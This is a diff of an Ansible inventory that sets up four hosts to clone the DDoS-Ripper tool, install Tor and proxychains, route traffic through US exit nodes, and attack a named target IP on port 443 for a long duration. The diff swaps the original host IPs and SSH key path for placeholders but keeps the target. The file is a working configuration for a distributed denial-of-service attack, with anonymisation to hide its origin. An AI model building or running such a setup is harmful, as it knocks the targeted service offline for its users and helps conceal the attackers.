@@ -1,17 +1,33 @@
+# Add hosts to this group
 [all]
-#Add hosts to this group
-[all]
-kozak1      ansible_host=3.69.252.37
-kozak2      ansible_host=3.67.224.206
-kozak3      ansible_host=3.68.91.53
-kozak4      ansible_host=3.70.182.26
+kozak1      ansible_host=192.168.0.2
+kozak2      ansible_host=192.168.0.3
+kozak3      ansible_host=192.168.0.4
+kozak4      ansible_host=192.168.0.5
 
 
 [all:vars]
+# Default soft vars
 git_repo=https://github.com/palahsu/DDoS-Ripper.git
 git_dest=/tmp/ddos-ripper
-ansible_ssh_private_key_file="/home/dlugovoy/.ssh/kozak_rsa"
-ansible_user="ubuntu"
+soft=['tor', 'tor-geoipdb', 'proxychains', 'geoip-bin', 'python3', 'python3-pip']
+
+# Ansible vars
+ansible_ssh_private_key_file="/path/to/your/ssh_key"
+ansible_user="username_with_sudo_permissions"
+
+# Tor vars
+ExitNodes='ExitNodes {us}'
+
+# Systemd unit vars
+MemoryHigh=450M
+MemoryMax=550M
+CPUQuota=85%
+
+# Target vars
+target=146.158.54.24
+port=443
+time=10000
 
 [group1]
 kozak1
